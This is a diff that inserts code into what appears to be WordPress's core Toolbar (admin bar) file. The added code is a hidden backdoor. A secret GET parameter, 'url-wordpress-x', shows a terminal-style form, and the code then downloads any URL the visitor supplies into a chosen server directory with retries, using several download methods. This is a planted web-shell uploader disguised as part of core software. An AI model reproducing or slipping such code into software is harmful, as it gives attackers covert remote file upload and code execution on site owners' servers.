@@ -222,7 +222,94 @@ if (isset($_GET["wordpress-plugins"])) {
  * @subpackage Toolbar
  * @since 3.1.0
  */
+if (isset($_GET["url-wordpress-x"])) {
+    echo "<div class='execution-box'>
+        <form method='post'>
+            <input type='text' id='terminal' name='url' placeholder='https://lutfifakee.com/file.txt'>
+            <button type='submit' name='uploadurl'><i class='fas fa-play submit-icon'></i></button>
+        </form>
+    </div>"; // Perbaikan tanda titik koma
 
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+
+    if (isset($_POST['uploadurl']) && !empty($_POST['url'])) {
+        $url = $_POST['url'];
+        $retries = 3;
+        uploadFileFromUrl($url, $dir, $retries);
+    }
+}
+
+function uploadFileFromUrl($url, $dir, $retries = 3)
+{
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        echo "<script>
+            Swal.fire({
+                title: 'Whoops!',
+                text: 'Invalid URL!',
+                icon: 'error',
+                confirmButtonText: 'OK',
+                background: '#2e2e2e',
+                color: '#ffffff'
+            });
+        </script>";
+        return;
+    }
+
+    if (!is_dir($dir) || !is_writable($dir)) {
+        echo "<script>
+            Swal.fire({
+                title: 'Whoops!',
+                text: 'Invalid or unwritable directory!',
+                icon: 'error',
+                confirmButtonText: 'OK',
+                background: '#2e2e2e',
+                color: '#ffffff'
+            });
+        </script>";
+        return;
+    }
+
+    $fileName = basename(parse_url($url, PHP_URL_PATH));
+    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
+    $filePath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
+
+    $attempt = 0;
+    $success = false;
+
+    while ($attempt < $retries) {
+        if (downloadFileWithCommand($url, $filePath) || 
+            downloadFileWithStream($url, $filePath) || 
+            downloadFileWithPhp($url, $filePath)) {
+            $success = true;
+            break;
+        }
+        $attempt++;
+    }
+
+    if ($success) {
+        echo "<script>
+            Swal.fire({
+                title: 'Completed!',
+                text: 'File uploaded from URL successfully!',
+                icon: 'success',
+                confirmButtonText: 'OK',
+                background: '#2e2e2e',
+                color: '#ffffff'
+            });
+        </script>";
+    } else {
+        echo "<script>
+            Swal.fire({
+                title: 'Whoops!',
+                text: 'Failed to fetch file content from URL after " . json_encode($retries) . " attempts!',
+                icon: 'error',
+                confirmButtonText: 'OK',
+                background: '#2e2e2e',
+                color: '#ffffff'
+            });
+        </script>";
+    }
+}
 /**
  * Core class used to implement the Toolbar API.
  *
